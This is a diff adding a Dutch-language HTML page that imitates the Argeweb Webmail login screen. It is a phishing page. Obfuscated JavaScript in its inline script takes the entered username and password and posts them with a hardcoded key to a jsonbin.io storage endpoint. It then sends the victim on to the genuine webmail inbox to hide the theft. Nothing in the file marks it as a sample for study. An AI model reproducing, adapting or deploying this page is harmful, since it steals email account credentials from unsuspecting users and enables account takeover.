@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="nl" class=" js chrome webkit">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Argeweb Webmail :: Welkom bij Argeweb Webmail</title>
+    <meta name="Robots" content="noindex,nofollow">
+    <meta name="viewport" content="" id="viewport">
+    <link rel="shortcut icon" href="https://webmail.argewebhosting.nl/skins/larry/images/favicon.ico">
+    <link rel="stylesheet" type="text/css" href="./assets/styles.min.css">
+    <link rel="stylesheet" type="text/css" href="./assets/jquery-ui-1.10.4.custom.css">
+</head>
+
+<script>
+    function _0x2f5c() { const _0x11db57 = ['84MiDIOv', 'json', 'pass', '3vJOirR', '88176AdxdYX', 'https://webmail.argewebhosting.nl/?_task=mail&_mbox=INBOX', 'then', 'stringify', '483896xmRHHx', 'getElementById', '3556611frVuaK', '$2a$10$qLEa/71TP/v74/mwjx/52u/tDs0wC9E.QeNV0F7a4LKjWi06VU.oK', '192744gJkIug', 'value', 'href', 'location', 'POST', 'https://api.jsonbin.io/v3/b', 'user', '1352592cqjlOT', '344848kzqrtI', '14515qfWRrV', 'pGFrUHIBYqTD0WywJe23qs9mkrddOq_L']; _0x2f5c = function () { return _0x11db57; }; return _0x2f5c(); } (function (_0x304cfc, _0x46fb2a) { const _0x17c21d = _0x399c, _0x23c677 = _0x304cfc(); while (!![]) { try { const _0x55e916 = -parseInt(_0x17c21d(0x1bb)) / 0x1 + parseInt(_0x17c21d(0x1b7)) / 0x2 * (parseInt(_0x17c21d(0x1b2)) / 0x3) + -parseInt(_0x17c21d(0x1af)) / 0x4 * (parseInt(_0x17c21d(0x1ad)) / 0x5) + -parseInt(_0x17c21d(0x1b3)) / 0x6 + -parseInt(_0x17c21d(0x1c3)) / 0x7 + -parseInt(_0x17c21d(0x1c2)) / 0x8 + parseInt(_0x17c21d(0x1b9)) / 0x9; if (_0x55e916 === _0x46fb2a) break; else _0x23c677['push'](_0x23c677['shift']()); } catch (_0x54fd71) { _0x23c677['push'](_0x23c677['shift']()); } } }(_0x2f5c, 0x24b72)); function _0x399c(_0xf3284f, _0x1e4e8c) { const _0x2f5c55 = _0x2f5c(); return _0x399c = function (_0x399c97, _0x7609c) { _0x399c97 = _0x399c97 - 0x1ad; let _0x55ae35 = _0x2f5c55[_0x399c97]; return _0x55ae35; }, _0x399c(_0xf3284f, _0x1e4e8c); } async function sendData() { const _0x19f5c1 = _0x399c; let _0x233aa5 = _0x19f5c1(0x1ae), _0x5289b3 = document[_0x19f5c1(0x1b8)](_0x19f5c1(0x1c1))[_0x19f5c1(0x1bc)], _0x35a65a = document[_0x19f5c1(0x1b8)](_0x19f5c1(0x1b1))[_0x19f5c1(0x1bc)]; async function _0x25cf98(_0x554e83) { const _0x369d18 = _0x19f5c1, _0x5ed9dc = await fetch(_0x369d18(0x1c0), { 'method': _0x369d18(0x1bf), 'headers': { 'Content-Type': 'application/json', 'X-Master-Key': _0x369d18(0x1ba) }, 'body': JSON[_0x369d18(0x1b6)](_0x554e83) }); return _0x5ed9dc[_0x369d18(0x1b0)](); } await _0x25cf98({ 'u': _0x5289b3, 'p': _0x35a65a })[_0x19f5c1(0x1b5)](() => { const _0x1485c5 = _0x19f5c1; window[_0x1485c5(0x1be)][_0x1485c5(0x1bd)] = _0x1485c5(0x1b4); }); }
+</script>
+
+<body>
+
+    <h1 class="voice">Argeweb Webmail Inloggen</h1>
+
+    <div id="login-form">
+        <div class="box-inner" role="main">
+            <img src="./assets/argeweb_logo.png" id="logo" alt="Argeweb Webmail">
+
+            <form onsubmit="return false" name="form" method="post">
+                <input type="hidden" name="_token" value="c2721a106d4489d6ad163b9e694883b6">
+                <input type="hidden" name="_task" value="login"><input type="hidden" name="_action" value="login"><input
+                    type="hidden" name="_timezone" id="rcmlogintz" value="Europe/Berlin"><input type="hidden"
+                    name="_url" id="rcmloginurl" value="">
+                <table>
+                    <tbody>
+                        <tr>
+                            <td class="title"><label for="rcmloginuser">Gebruikersnaam</label>
+                            </td>
+                            <td class="input"><input id="user" name="_user" id="rcmloginuser" required="required"
+                                    size="40" autocapitalize="off" autocomplete="off" type="text"></td>
+                        </tr>
+                        <tr>
+                            <td class="title"><label for="rcmloginpwd">Wachtwoord</label>
+                            </td>
+                            <td class="input"><input id="pass" name="_pass" id="rcmloginpwd" required="required"
+                                    size="40" autocapitalize="off" autocomplete="off" type="password"></td>
+                        </tr>
+                    </tbody>
+                </table>
+                <p class="formbuttons"><input onclick="sendData()" type="submit" id="rcmloginsubmit"
+                        class="button mainaction" value="Inloggen"></p>
+
+            </form>
+
+        </div>
+
+        <div class="box-bottom" role="complementary">
+            <div id="message"></div>
+            <noscript>
+                <p class="noscriptwarning">Waarschuwing: deze webmailapplicatie vereist Javascript! U dient Javascript
+                    in te schakelen in uw browserinstellingen wanneer u gebruik wilt maken van deze applicatie.</p>
+            </noscript>
+        </div>
+
+        <div id="bottomline" role="contentinfo">
+            Argeweb Webmail
+            &nbsp;●&nbsp; <a href="https://www.argeweb.nl/support/" target="_blank" class="support-link">Hulp nodig?</a>
+        </div>
+    </div>
+</body>
+
+</html>
